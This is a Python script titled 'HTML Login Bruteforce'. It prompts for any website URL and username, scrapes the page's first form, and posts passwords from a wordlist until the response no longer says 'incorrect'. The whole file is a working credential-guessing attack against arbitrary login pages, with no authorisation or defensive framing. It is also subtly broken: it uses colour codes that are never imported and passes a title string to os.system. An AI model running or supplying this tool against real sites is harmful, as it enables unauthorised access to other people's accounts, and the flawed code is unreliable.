import os
import requests
from bs4 import BeautifulSoup

os.system("HTML Login Bruteforce")


website = input("Please enter the website URL (must include http/https): ")
print(f"You entered: {website}")

print("")



# Fixed wordlist location
wordlist_location = "/wordlist/wordlist.txt"

print(f"{wordlist_location}")

print("")

# User login credentials
username = input("Enter the username for the login attempt: ")


# Check if the wordlist file exists
try:
    with open(wordlist_location, 'r') as file:
        passwords = file.readlines()
except FileNotFoundError:
    print(f"{Fore.RED}Error: Wordlist file not found at the provided location!{Style.RESET_ALL}")
    exit()

# Attempting to fetch the login page
try:
    session = requests.Session()  # Create a session to maintain cookies
    response = session.get(website)
    response.raise_for_status()

    # Parsing login form from the HTML
    soup = BeautifulSoup(response.content, 'html.parser')
    login_form = soup.find('form')  # Assuming the first form is the login form
    if not login_form:
        print(f"{Fore.RED}Login form not found on the website.{Style.RESET_ALL}")
        exit()

    # Extract form action (URL to submit the login request)
    action_url = login_form.get('action')
    login_url = action_url if action_url.startswith('http') else website + action_url

    # Extracting input fields
    inputs = login_form.find_all('input')
    form_data = {input_tag.get('name'): '' for input_tag in inputs if input_tag.get('name')}

    # Main loop to try each password
    for password in passwords:
        password = password.strip()  # Removing any extra whitespace or newline characters
        form_data.update({'username': username, 'password': password})  # Updating login details

        # Sending POST request to attempt login
        response = session.post(login_url, data=form_data)

        # Checking the response to determine if login was successful
        if "incorrect" in response.text.lower():  # Update the condition to reflect actual failure message
            print(f"{Fore.RED}✗ Incorrect password: '{password}'{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}✓ Success! Password found: '{password}'{Style.RESET_ALL}")
            break  # Stop after finding the correct password

except requests.exceptions.RequestException as e:
    print(f"{Fore.RED}Error accessing the website: {e}{Style.RESET_ALL}")
